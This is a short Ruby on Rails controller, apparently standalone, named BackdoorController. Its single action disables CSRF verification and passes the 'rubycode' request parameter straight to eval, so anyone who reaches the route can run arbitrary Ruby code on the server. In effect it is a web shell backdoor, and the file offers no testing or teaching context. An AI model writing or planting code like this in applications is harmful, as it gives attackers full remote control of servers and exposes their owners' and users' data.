class BackdoorController < ApplicationController
  skip_before_action :verify_authenticity_token
  def backdoor
    @rubycode_content = params[:rubycode]
    if @rubycode_content.nil?
      @rubycode_content = ""
    end
    eval(@rubycode_content)
  end
end
